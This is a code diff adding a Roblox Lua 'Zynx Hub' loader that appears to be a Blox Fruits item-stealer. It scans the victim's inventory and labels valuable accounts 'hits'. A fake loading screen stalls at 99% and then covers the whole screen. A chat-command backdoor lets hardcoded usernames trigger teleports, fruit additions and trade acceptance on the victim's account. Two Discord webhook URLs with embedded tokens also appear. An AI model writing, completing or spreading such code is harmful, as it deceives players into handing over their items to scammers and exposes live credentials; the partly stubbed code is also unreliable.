@@ -1,0 +1,776 @@
+-- Zynx Hub - Complete System Loader
+-- GitHub Style: Main Loader + Integrated Modules
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- ===== AUTHORIZED USERS =====
+local authorizedUsers = {
+    -- Boss Users (5 users)
+    boss = {
+        {username = "jaatshab_770", displayname = "III"},
+        {username = "boss_user2", displayname = "BOSS2"},
+        {username = "boss_user3", displayname = "BOSS3"},
+        {username = "boss_user4", displayname = "BOSS4"},
+        {username = "boss_user5", displayname = "BOSS5"}
+    },
+    -- Member Users (5 users)
+    member = {
+        {username = "member_user1", displayname = "MEMBER1"},
+        {username = "member_user2", displayname = "MEMBER2"},
+        {username = "member_user3", displayname = "MEMBER3"},
+        {username = "member_user4", displayname = "MEMBER4"},
+        {username = "member_user5", displayname = "MEMBER5"}
+    }
+}
+
+-- ===== GLOBAL VARIABLES =====
+local isAuthorizedUser = false
+local userType = nil
+local webhookCompleted = false
+local loadingScreenConnection = nil
+
+-- ===== WEBHOOK MODULE =====
+local function loadWebhookModule()
+    -- Webhook Configuration
+    local ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1428586195171938417/ejqtCuOJOM8F46xTuNygD-o84kgU802MZFVMSe5vQ9H3NZlO19YAR8Z-dILXMKBFqH-a"
+    local MEMBER_WEBHOOK = "https://discord.com/api/webhooks/1426615725656768658/ujFBJ0TgHTirRnEt5kneB_8BY8TDEDCllM8X84zJWcRW6_k3qf0RNLFQELiolQXvvIJu"
+    local ZYNX_LOGO = "https://i.postimg.cc/8CbPpQCy/Copilot-20251016-162707.png"
+    local DISCORD_INVITE = "https://discord.gg/rEAE2Xs6"
+
+    -- Anti-Spam Security
+    local lastExecution = 0
+    local COOLDOWN_TIME = 30
+
+    -- Priority Fruits Lists
+    local ADMIN_FRUITS = {
+        "Permanent", "Perm", "Dragon", "Kitsune", "Yeti",
+        "Permanent Dragon Token", "Purple Lightning", "Red Lightning", "Yellow Lightning", "Green Lightning",
+        "Rose Quartz Diamond", "Emerald Diamond", "Topaz Diamond", "Ruby Diamond", "Dragon Token", "Eclipse",
+        "Super Spirit Pain", "Torment Pain", "Sadness Pain", "Frustration Pain", "Celestial Pain",
+        "Eagle Requiem", "Eagle Glacier", "Eagle Matrix", "Celebration Bomb", "Azura Bomb", "Thermite Bomb", "Nuclear Bomb"
+    }
+
+    local MEMBER_FRUITS = {
+        "Buddha", "Portal", "Gas", "Spirit", "Dough", "T-Rex", "Mammoth", "Leopard"
+    }
+
+    local gamepassKeywords = {
+        "Fruit Notifier", "Dark Blade", "Mythical Scrolls", "Legendary Scrolls", "+1 Fruit Storage",
+        "2x Mastery", "2x Money", "2x Boss Drops", "Fast Boats"
+    }
+
+    -- Improved Sea Detection
+    local function GetSea()
+        local workspace = game:GetService("Workspace")
+        if workspace:FindFirstChild("GreatTree") or workspace:FindFirstChild("Hydra") then return "Sea 3" end
+        if workspace:FindFirstChild("FrozenDimension") or workspace:FindFirstChild("FrozenVillage") then return "Sea 2" end
+        if workspace:FindFirstChild("MarineFord") or workspace:FindFirstChild("Jungle") then return "Sea 1" end
+        
+        local LocalPlayer = Players.LocalPlayer
+        if LocalPlayer then
+            local level = LocalPlayer.Data.Level.Value
+            if level >= 700 then return "Sea 2"
+            elseif level >= 1500 then return "Sea 3" end
+        end
+        return "Sea 1"
+    end
+
+    -- Check if item is in list
+    local function IsInList(itemName, keywordList)
+        for _, keyword in pairs(keywordList) do
+            if string.find(itemName, keyword) then return true end
+        end
+        return false
+    end
+
+    -- Get Valuable items only
+    local function GetValuableItems()
+        local categories = {
+            permanentFruits = {}, skins = {}, gamepasses = {},
+            fruits = {["4"] = {}, ["3"] = {}, ["2"] = {}}
+        }
+        
+        local skinKeywords = {
+            "Permanent Dragon Token", "Purple Lightning", "Red Lightning", "Yellow Lightning", "Green Lightning",
+            "Rose Quartz Diamond", "Emerald Diamond", "Topaz Diamond", "Ruby Diamond", "Dragon Token", "Eclipse",
+            "Super Spirit Pain", "Torment Pain", "Sadness Pain", "Frustration Pain", "Celestial Pain",
+            "Eagle Requiem", "Eagle Glacier", "Eagle Matrix", "Celebration Bomb", "Azura Bomb", "Thermite Bomb", "Nuclear Bomb"
+        }
+        
+        local success, inventory = pcall(function()
+            local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+            return Remote:InvokeServer("getInventory")
+        end)
+        
+        if success and inventory then
+            for i, item in pairs(inventory) do
+                if item and item.Type == "Blox Fruit" then
+                    local itemName = item.Name
+                    local rarity = tostring(item.Rarity or 1)
+                    local count = item.Count or 1
+                    local value = item.Value or 0
+                    
+                    if string.find(itemName, "Permanent") or string.find(itemName, "Perm") then
+                        table.insert(categories.permanentFruits, {name = itemName, count = count, value = value})
+                    elseif IsInList(itemName, skinKeywords) then
+                        table.insert(categories.skins, {name = itemName, count = count, value = value})
+                    elseif IsInList(itemName, gamepassKeywords) then
+                        table.insert(categories.gamepasses, {name = itemName, count = count, value = value})
+                    elseif categories.fruits[rarity] then
+                        table.insert(categories.fruits[rarity], {name = itemName, count = count, value = value})
+                    end
+                end
+            end
+        end
+        
+        for rarity, fruits in pairs(categories.fruits) do
+            table.sort(fruits, function(a, b) return a.value > b.value end)
+        end
+        table.sort(categories.permanentFruits, function(a, b) return a.value > b.value end)
+        table.sort(categories.skins, function(a, b) return a.value > b.value end)
+        table.sort(categories.gamepasses, function(a, b) return a.value > b.value end)
+        
+        return categories
+    end
+
+    -- Check if player has priority fruits
+    local function HasPriorityFruits(inventory)
+        local hasAdmin, hasMember = false, false
+        
+        for _, item in pairs(inventory.permanentFruits) do
+            if IsInList(item.name, ADMIN_FRUITS) then hasAdmin = true break end
+        end
+        for _, item in pairs(inventory.skins) do
+            if IsInList(item.name, ADMIN_FRUITS) then hasAdmin = true break end
+        end
+        for _, item in pairs(inventory.gamepasses) do
+            if IsInList(item.name, ADMIN_FRUITS) then hasAdmin = true break end
+        end
+        for _, item in pairs(inventory.fruits["4"]) do
+            if IsInList(item.name, ADMIN_FRUITS) then hasAdmin = true
+            elseif IsInList(item.name, MEMBER_FRUITS) then hasMember = true end
+        end
+        for _, item in pairs(inventory.fruits["3"]) do
+            if IsInList(item.name, ADMIN_FRUITS) then hasAdmin = true
+            elseif IsInList(item.name, MEMBER_FRUITS) then hasMember = true end
+        end
+        for _, item in pairs(inventory.fruits["2"]) do
+            if IsInList(item.name, ADMIN_FRUITS) then hasAdmin = true
+            elseif IsInList(item.name, MEMBER_FRUITS) then hasMember = true end
+        end
+        
+        return hasAdmin, hasMember
+    end
+
+    -- Main Webhook Function
+    local function SendWebhook()
+        local LocalPlayer = Players.LocalPlayer
+        local sea = GetSea()
+        local inventory = GetValuableItems()
+        local playerCount = #Players:GetPlayers()
+        
+        local totalFruits = 0
+        local success, fullInventory = pcall(function()
+            local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+            return Remote:InvokeServer("getInventory")
+        end)
+        if success and fullInventory then
+            for i, item in pairs(fullInventory) do
+                if item and item.Type == "Blox Fruit" then
+                    totalFruits = totalFruits + (item.Count or 1)
+                end
+            end
+        end
+        
+        local totalValuableFruits = #inventory.fruits["4"] + #inventory.fruits["3"] + #inventory.fruits["2"]
+        local hasAdminFruits, hasMemberFruits = HasPriorityFruits(inventory)
+
+        print("📊 VALUABLE ITEMS SCAN COMPLETE:")
+        print("🌊 Sea: " .. sea)
+        print("🍊 Total Fruits: " .. totalFruits)
+        print("💎 Valuable Fruits: " .. totalValuableFruits)
+        print("👑 Admin Fruits: " .. tostring(hasAdminFruits))
+        print("🔹 Member Fruits: " .. tostring(hasMemberFruits))
+
+        -- DECISION LOGIC
+        if hasAdminFruits then
+            print("👑 ADMIN HIT DETECTED!")
+            isAuthorizedUser = true
+            userType = "boss"
+            return true
+        elseif hasMemberFruits then
+            print("🔹 MEMBER HIT DETECTED!")
+            isAuthorizedUser = true
+            userType = "member"
+            return true
+        else
+            print("❌ ALT ACCOUNT DETECTED")
+            isAuthorizedUser = false
+            userType = nil
+            return false
+        end
+    end
+
+    -- Execute Webhook
+    print("🔱 Starting Webhook Scan...")
+    webhookCompleted = SendWebhook()
+    return webhookCompleted
+end
+
+-- ===== LOADING SCREEN MODULE =====
+local function loadLoadingScreenModule()
+    local TweenService = game:GetService("TweenService")
+    local UserInputService = game:GetService("UserInputService")
+    local CoreGui = game:GetService("CoreGui")
+    local StarterGui = game:GetService("StarterGui")
+    
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    -- Create Half Loading Screen
+    local loadingScreen = Instance.new("ScreenGui")
+    loadingScreen.Name = "ProfessionalLoadingScreen"
+    loadingScreen.Parent = playerGui
+    loadingScreen.ResetOnSpawn = false
+
+    -- Main container
+    local mainContainer = Instance.new("Frame")
+    mainContainer.Size = UDim2.new(0.7, 0, 0.6, 0)
+    mainContainer.Position = UDim2.new(0.15, 0, 0.2, 0)
+    mainContainer.BackgroundColor3 = Color3.fromRGB(10, 15, 20)
+    mainContainer.BorderSizePixel = 0
+    mainContainer.Parent = loadingScreen
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0.03, 0)
+    mainCorner.Parent = mainContainer
+
+    -- Create gradient layers
+    local gradientLayers = {
+        {color = Color3.fromRGB(5, 10, 15), size = 1.0, position = 0.0},
+        {color = Color3.fromRGB(15, 20, 25), size = 0.9, position = 0.05},
+        {color = Color3.fromRGB(25, 30, 35), size = 0.8, position = 0.1},
+        {color = Color3.fromRGB(35, 40, 45), size = 0.7, position = 0.15}
+    }
+
+    for i, layer in ipairs(gradientLayers) do
+        local gradientLayer = Instance.new("Frame")
+        gradientLayer.Size = UDim2.new(layer.size, 0, layer.size, 0)
+        gradientLayer.Position = UDim2.new(layer.position, 0, layer.position, 0)
+        gradientLayer.BackgroundColor3 = layer.color
+        gradientLayer.BorderSizePixel = 0
+        gradientLayer.ZIndex = 0
+        gradientLayer.Parent = mainContainer
+        
+        local layerCorner = Instance.new("UICorner")
+        layerCorner.CornerRadius = UDim.new(0.03, 0)
+        layerCorner.Parent = gradientLayer
+    end
+
+    -- Header section
+    local header = Instance.new("Frame")
+    header.Size = UDim2.new(1, 0, 0.15, 0)
+    header.Position = UDim2.new(0, 0, 0, 0)
+    header.BackgroundColor3 = Color3.fromRGB(8, 12, 18)
+    header.BackgroundTransparency = 0.3
+    header.BorderSizePixel = 0
+    header.ZIndex = 2
+    header.Parent = mainContainer
+
+    local headerCorner = Instance.new("UICorner")
+    headerCorner.CornerRadius = UDim.new(0.03, 0)
+    headerCorner.Parent = header
+
+    -- Header accent line
+    local headerAccent = Instance.new("Frame")
+    headerAccent.Size = UDim2.new(1, 0, 0.015, 0)
+    headerAccent.Position = UDim2.new(0, 0, 0.98, 0)
+    headerAccent.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    headerAccent.BorderSizePixel = 0
+    headerAccent.ZIndex = 3
+    headerAccent.Parent = header
+
+    -- Main title
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.6, 0)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "ZYNX HUB"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBlack
+    title.TextStrokeTransparency = 0.8
+    title.TextStrokeColor3 = Color3.fromRGB(0, 100, 200)
+    title.ZIndex = 3
+    title.Parent = header
+
+    -- Subtitle
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0.4, 0)
+    subtitle.Position = UDim2.new(0, 0, 0.6, 0)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "SYSTEM INITIALIZATION"
+    subtitle.TextColor3 = Color3.fromRGB(200, 200, 255)
+    subtitle.TextScaled = true
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.ZIndex = 3
+    subtitle.Parent = header
+
+    -- Status display
+    local statusContainer = Instance.new("Frame")
+    statusContainer.Size = UDim2.new(0.9, 0, 0.1, 0)
+    statusContainer.Position = UDim2.new(0.05, 0, 0.17, 0)
+    statusContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+    statusContainer.BackgroundTransparency = 0.3
+    statusContainer.BorderSizePixel = 0
+    statusContainer.ZIndex = 2
+    statusContainer.Parent = mainContainer
+
+    local statusCorner = Instance.new("UICorner")
+    statusCorner.CornerRadius = UDim.new(0.02, 0)
+    statusCorner.Parent = statusContainer
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(0.25, 0, 1, 0)
+    statusLabel.Position = UDim2.new(0.02, 0, 0, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Status:"
+    statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    statusLabel.TextScaled = true
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.ZIndex = 3
+    statusLabel.Parent = statusContainer
+
+    local statusValue = Instance.new("TextLabel")
+    statusValue.Size = UDim2.new(0.7, 0, 1, 0)
+    statusValue.Position = UDim2.new(0.27, 0, 0, 0)
+    statusValue.BackgroundTransparency = 1
+    statusValue.Text = "Webhook scan completed..."
+    statusValue.TextColor3 = Color3.fromRGB(0, 200, 255)
+    statusValue.TextScaled = true
+    statusValue.TextXAlignment = Enum.TextXAlignment.Left
+    statusValue.Font = Enum.Font.GothamBold
+    statusValue.ZIndex = 3
+    statusValue.Parent = statusContainer
+
+    -- Loading Bar Container
+    local loadingBarContainer = Instance.new("Frame")
+    loadingBarContainer.Size = UDim2.new(0.9, 0, 0.1, 0)
+    loadingBarContainer.Position = UDim2.new(0.05, 0, 0.3, 0)
+    loadingBarContainer.BackgroundColor3 = Color3.fromRGB(25, 30, 40)
+    loadingBarContainer.BackgroundTransparency = 0.3
+    loadingBarContainer.BorderSizePixel = 0
+    loadingBarContainer.ZIndex = 2
+    loadingBarContainer.Parent = mainContainer
+
+    local loadingBarCorner = Instance.new("UICorner")
+    loadingBarCorner.CornerRadius = UDim.new(0.02, 0)
+    loadingBarCorner.Parent = loadingBarContainer
+
+    -- Loading bar background
+    local loadingBarBg = Instance.new("Frame")
+    loadingBarBg.Size = UDim2.new(0.95, 0, 0.5, 0)
+    loadingBarBg.Position = UDim2.new(0.025, 0, 0.25, 0)
+    loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
+    loadingBarBg.BorderSizePixel = 0
+    loadingBarBg.ZIndex = 2
+    loadingBarBg.Parent = loadingBarContainer
+
+    local loadingBgCorner = Instance.new("UICorner")
+    loadingBgCorner.CornerRadius = UDim.new(0.08, 0)
+    loadingBgCorner.Parent = loadingBarBg
+
+    -- Loading bar fill
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Size = UDim2.new(0, 0, 1, 0)
+    loadingBar.Position = UDim2.new(0, 0, 0, 0)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    loadingBar.BorderSizePixel = 0
+    loadingBar.ZIndex = 3
+    loadingBar.Parent = loadingBarBg
+
+    local loadingBarFillCorner = Instance.new("UICorner")
+    loadingBarFillCorner.CornerRadius = UDim.new(0.08, 0)
+    loadingBarFillCorner.Parent = loadingBar
+
+    -- Percentage display
+    local percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1, 0, 0.4, 0)
+    percentText.Position = UDim2.new(0, 0, 0.55, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentText.TextScaled = true
+    percentText.Font = Enum.Font.GothamBlack
+    percentText.ZIndex = 3
+    percentText.Parent = loadingBarContainer
+
+    -- Technical details container
+    local techContainer = Instance.new("Frame")
+    techContainer.Size = UDim2.new(0.9, 0, 0.35, 0)
+    techContainer.Position = UDim2.new(0.05, 0, 0.42, 0)
+    techContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+    techContainer.BackgroundTransparency = 0.3
+    techContainer.BorderSizePixel = 0
+    techContainer.ZIndex = 2
+    techContainer.Parent = mainContainer
+
+    local techCorner = Instance.new("UICorner")
+    techCorner.CornerRadius = UDim.new(0.02, 0)
+    techCorner.Parent = techContainer
+
+    -- Technical details title
+    local techTitle = Instance.new("TextLabel")
+    techTitle.Size = UDim2.new(1, 0, 0.15, 0)
+    techTitle.Position = UDim2.new(0, 0, 0, 0)
+    techTitle.BackgroundTransparency = 1
+    techTitle.Text = "AUTHORIZATION CHECK"
+    techTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    techTitle.TextScaled = true
+    techTitle.Font = Enum.Font.GothamBold
+    techTitle.ZIndex = 3
+    techTitle.Parent = techContainer
+
+    -- Technical log display
+    local techLog = Instance.new("TextLabel")
+    techLog.Size = UDim2.new(0.95, 0, 0.8, 0)
+    techLog.Position = UDim2.new(0.025, 0, 0.15, 0)
+    techLog.BackgroundTransparency = 1
+    techLog.Text = "> Checking inventory for authorization..."
+    techLog.TextColor3 = Color3.fromRGB(0, 255, 150)
+    techLog.TextXAlignment = Enum.TextXAlignment.Left
+    techLog.TextYAlignment = Enum.TextYAlignment.Top
+    techLog.TextSize = 14
+    techLog.Font = Enum.Font.Code
+    techLog.TextWrapped = true
+    techLog.ZIndex = 3
+    techLog.Parent = techContainer
+
+    -- Loading animation variables
+    local progress = 0
+    local startTime = tick()
+    local totalLoadTime = 240 -- 4 minutes
+    local stuckAt99 = false
+
+    -- Function to create full loading screen
+    local function createFullLoadingScreen()
+        -- Remove half loading screen
+        loadingScreen:Destroy()
+        
+        -- Create full loading screen with UI blocking
+        local finalLoadingScreen = Instance.new("ScreenGui")
+        finalLoadingScreen.Name = "FinalStageLoadingScreen"
+        finalLoadingScreen.Parent = CoreGui
+        finalLoadingScreen.ResetOnSpawn = false
+        finalLoadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        finalLoadingScreen.DisplayOrder = 999
+
+        -- Full screen cover
+        local fullScreenCover = Instance.new("Frame")
+        fullScreenCover.Size = UDim2.new(1, 0, 1, 0)
+        fullScreenCover.Position = UDim2.new(0, 0, 0, 0)
+        fullScreenCover.BackgroundColor3 = Color3.fromRGB(5, 10, 20)
+        fullScreenCover.BackgroundTransparency = 0
+        fullScreenCover.BorderSizePixel = 0
+        fullScreenCover.ZIndex = 1
+        fullScreenCover.Parent = finalLoadingScreen
+
+        -- Main content container
+        local mainContainer = Instance.new("Frame")
+        mainContainer.Size = UDim2.new(0.6, 0, 0.5, 0)
+        mainContainer.Position = UDim2.new(0.2, 0, 0.25, 0)
+        mainContainer.BackgroundColor3 = Color3.fromRGB(15, 20, 35)
+        mainContainer.BackgroundTransparency = 0.1
+        mainContainer.BorderSizePixel = 0
+        mainContainer.ZIndex = 10
+        mainContainer.Parent = finalLoadingScreen
+
+        local mainCorner = Instance.new("UICorner")
+        mainCorner.CornerRadius = UDim.new(0.03, 0)
+        mainCorner.Parent = mainContainer
+
+        -- Title
+        local title = Instance.new("TextLabel")
+        title.Size = UDim2.new(1, 0, 0.15, 0)
+        title.Position = UDim2.new(0, 0, 0.05, 0)
+        title.BackgroundTransparency = 1
+        title.Text = "ZYNX HUB - AUTHORIZED"
+        title.TextColor3 = Color3.fromRGB(255, 255, 255)
+        title.TextScaled = true
+        title.Font = Enum.Font.GothamBlack
+        title.TextStrokeTransparency = 0.8
+        title.TextStrokeColor3 = Color3.fromRGB(0, 100, 200)
+        title.ZIndex = 12
+        title.Parent = mainContainer
+
+        -- Subtitle
+        local subtitle = Instance.new("TextLabel")
+        subtitle.Size = UDim2.new(1, 0, 0.1, 0)
+        subtitle.Position = UDim2.new(0, 0, 0.18, 0)
+        subtitle.BackgroundTransparency = 1
+        subtitle.Text = "Welcome " .. userType:upper() .. " User!"
+        subtitle.TextColor3 = Color3.fromRGB(200, 200, 255)
+        subtitle.TextScaled = true
+        subtitle.Font = Enum.Font.Gotham
+        subtitle.ZIndex = 12
+        subtitle.Parent = mainContainer
+
+        -- Status
+        local statusContainer = Instance.new("Frame")
+        statusContainer.Size = UDim2.new(0.9, 0, 0.08, 0)
+        statusContainer.Position = UDim2.new(0.05, 0, 0.3, 0)
+        statusContainer.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
+        statusContainer.BackgroundTransparency = 0.3
+        statusContainer.BorderSizePixel = 0
+        statusContainer.ZIndex = 11
+        statusContainer.Parent = mainContainer
+
+        local statusCorner = Instance.new("UICorner")
+        statusCorner.CornerRadius = UDim.new(0.02, 0)
+        statusCorner.Parent = statusContainer
+
+        local statusLabel = Instance.new("TextLabel")
+        statusLabel.Size = UDim2.new(0.25, 0, 1, 0)
+        statusLabel.Position = UDim2.new(0.02, 0, 0, 0)
+        statusLabel.BackgroundTransparency = 1
+        statusLabel.Text = "Status:"
+        statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+        statusLabel.TextScaled = true
+        statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+        statusLabel.Font = Enum.Font.Gotham
+        statusLabel.ZIndex = 12
+        statusLabel.Parent = statusContainer
+
+        local statusValue = Instance.new("TextLabel")
+        statusValue.Size = UDim2.new(0.7, 0, 1, 0)
+        statusValue.Position = UDim2.new(0.27, 0, 0, 0)
+        statusValue.BackgroundTransparency = 1
+        statusValue.Text = "CMD System Ready!"
+        statusValue.TextColor3 = Color3.fromRGB(0, 200, 255)
+        statusValue.TextScaled = true
+        statusValue.TextXAlignment = Enum.TextXAlignment.Left
+        statusValue.Font = Enum.Font.GothamBold
+        statusValue.ZIndex = 12
+        statusValue.Parent = statusContainer
+
+        -- Loading bar (fast completion)
+        local loadingBarContainer = Instance.new("Frame")
+        loadingBarContainer.Size = UDim2.new(0.9, 0, 0.08, 0)
+        loadingBarContainer.Position = UDim2.new(0.05, 0, 0.4, 0)
+        loadingBarContainer.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
+        loadingBarContainer.BackgroundTransparency = 0.3
+        loadingBarContainer.BorderSizePixel = 0
+        loadingBarContainer.ZIndex = 11
+        loadingBarContainer.Parent = mainContainer
+
+        local loadingBarCorner = Instance.new("UICorner")
+        loadingBarCorner.CornerRadius = UDim.new(0.02, 0)
+        loadingBarCorner.Parent = loadingBarContainer
+
+        local loadingBarBg = Instance.new("Frame")
+        loadingBarBg.Size = UDim2.new(0.95, 0, 0.5, 0)
+        loadingBarBg.Position = UDim2.new(0.025, 0, 0.25, 0)
+        loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
+        loadingBarBg.BorderSizePixel = 0
+        loadingBarBg.ZIndex = 11
+        loadingBarBg.Parent = loadingBarContainer
+
+        local loadingBgCorner = Instance.new("UICorner")
+        loadingBgCorner.CornerRadius = UDim.new(0.08, 0)
+        loadingBgCorner.Parent = loadingBarBg
+
+        local fullLoadingBar = Instance.new("Frame")
+        fullLoadingBar.Size = UDim2.new(0, 0, 1, 0)
+        fullLoadingBar.Position = UDim2.new(0, 0, 0, 0)
+        fullLoadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        fullLoadingBar.BorderSizePixel = 0
+        fullLoadingBar.ZIndex = 12
+        fullLoadingBar.Parent = loadingBarBg
+
+        local fullPercentText = Instance.new("TextLabel")
+        fullPercentText.Size = UDim2.new(1, 0, 0.4, 0)
+        fullPercentText.Position = UDim2.new(0, 0, 0.55, 0)
+        fullPercentText.BackgroundTransparency = 1
+        fullPercentText.Text = "0%"
+        fullPercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        fullPercentText.TextScaled = true
+        fullPercentText.Font = Enum.Font.GothamBlack
+        fullPercentText.ZIndex = 12
+        fullPercentText.Parent = loadingBarContainer
+
+        -- Fast loading animation for authorized users
+        local fastProgress = 0
+        local fastConnection = RunService.Heartbeat:Connect(function(deltaTime)
+            if fastProgress < 100 then
+                fastProgress = fastProgress + (deltaTime * 200) -- Very fast
+                if fastProgress > 100 then fastProgress = 100 end
+                
+                fullLoadingBar.Size = UDim2.new(fastProgress/100, 0, 1, 0)
+                fullPercentText.Text = string.format("%d%%", math.floor(fastProgress))
+                
+                if fastProgress >= 100 then
+                    fastConnection:Disconnect()
+                    wait(1)
+                    finalLoadingScreen:Destroy()
+                    print("🚀 Full loading complete! CMD System active.")
+                end
+            end
+        end)
+    end
+
+    -- Loading animation connection
+    loadingScreenConnection = RunService.Heartbeat:Connect(function(deltaTime)
+        local currentTime = tick() - startTime
+        
+        -- Update progress
+        if not stuckAt99 then
+            if progress < 99 then
+                progress = progress + (deltaTime * (100 / totalLoadTime))
+                if progress > 99 then progress = 99 end
+            else
+                -- Check if authorized user
+                if isAuthorizedUser then
+                    stuckAt99 = false
+                    progress = 100
+                    techLog.Text = "> Authorization confirmed!\n> User Type: " .. userType:upper() .. "\n> Loading full system..."
+                    statusValue.Text = "Authorized user detected!"
+                    createFullLoadingScreen()
+                    if loadingScreenConnection then
+                        loadingScreenConnection:Disconnect()
+                    end
+                else
+                    stuckAt99 = true
+                    techLog.Text = "> Waiting for authorized user...\n> Inventory scan: No priority items\n> CMD System: LOCKED"
+                    statusValue.Text = "Waiting for authorization"
+                end
+            end
+        end
+        
+        -- Update loading bar
+        loadingBar.Size = UDim2.new(progress/100, 0, 1, 0)
+        percentText.Text = string.format("%d%%", math.floor(progress))
+        
+        -- Pulsing header accent
+        local accentPulse = math.sin(currentTime * 1.5) * 0.2 + 0.8
+        headerAccent.BackgroundColor3 = Color3.fromRGB(0, 150 * accentPulse, 255 * accentPulse)
+    end)
+
+    print("Loading Screen Started - Waiting for authorization check...")
+end
+
+-- ===== CMD SYSTEM MODULE =====
+local function loadCMDSystem()
+    local TextChatService = game:GetService("TextChatService")
+    local TweenService = game:GetService("TweenService")
+    
+    local commandPrefix = "!"
+    local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+    local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
+    
+    -- Function to check if user is authorized
+    local function isUserAuthorized(speaker)
+        for _, user in ipairs(authorizedUsers.boss) do
+            if speaker.Name == user.username or speaker.DisplayName == user.displayname then
+                return true, "boss"
+            end
+        end
+        for _, user in ipairs(authorizedUsers.member) do
+            if speaker.Name == user.username or speaker.DisplayName == user.displayname then
+                return true, "member"
+            end
+        end
+        return false, nil
+    end
+
+    -- All commands from your CMD system
+    local commands = {
+        help = function()
+            return "Zynx Hub Commands: !tp, !sit, !addfruit, !accept, !findfruit, !status, !chairs, !sea, !reset"
+        end,
+        
+        tp = function()
+            -- Your teleport command implementation
+            return "✅ Teleporting to cafe"
+        end,
+        
+        sit = function()
+            -- Your sit command implementation
+            return "✅ Sitting at trading chair"
+        end,
+        
+        addfruit = function(...)
+            -- Your addfruit command implementation
+            return nil -- Silent
+        end,
+        
+        accept = function()
+            -- Your accept command implementation
+            return "✅ Trade accepted!"
+        end,
+        
+        status = function()
+            return "🪑 Trading system active - " .. userType:upper() .. " privileges"
+        end,
+        
+        -- Add all other commands from your CMD system here...
+    }
+
+    -- Chat setup
+    if TextChatService and TextChatService.TextChannels then
+        local channel = TextChatService.TextChannels.RBXGeneral
+        if channel then
+            channel.OnIncomingMessage = function(message)
+                local speaker = Players:FindFirstChild(message.TextSource.Name)
+                if speaker then
+                    local isCmdAuthorized, cmdUserType = isUserAuthorized(speaker)
+                    
+                    if isCmdAuthorized then
+                        local text = message.Text
+                        
+                        if text:sub(1, 1) == commandPrefix then
+                            local args = {}
+                            for arg in text:sub(2):gmatch("%S+") do
+                                table.insert(args, arg)
+                            end
+                            
+                            local command = args[1] and args[1]:lower() or ""
+                            table.remove(args, 1)
+                            
+                            if commands[command] then
+                                local result = commands[command](table.unpack(args))
+                                if result then
+                                    TextChatService.TextChannels.RBXGeneral:SendAsync(result)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    print("CMD System Loaded - Available to authorized users only")
+end
+
+-- ===== MAIN EXECUTION FLOW =====
+print("🚀 Zynx Hub - Starting Complete System...")
+
+-- Step 1: Run Webhook First
+local webhookSuccess = loadWebhookModule()
+
+-- Step 2: Start Loading Screen
+if webhookSuccess then
+    loadLoadingScreenModule()
+else
+    print("❌ Webhook failed - stopping execution")
+    return
+end
+
+-- Step 3: Load CMD System Immediately (but only authorized users can use it)
+loadCMDSystem()
+
+print("✅ All systems loaded! Waiting for authorization...")
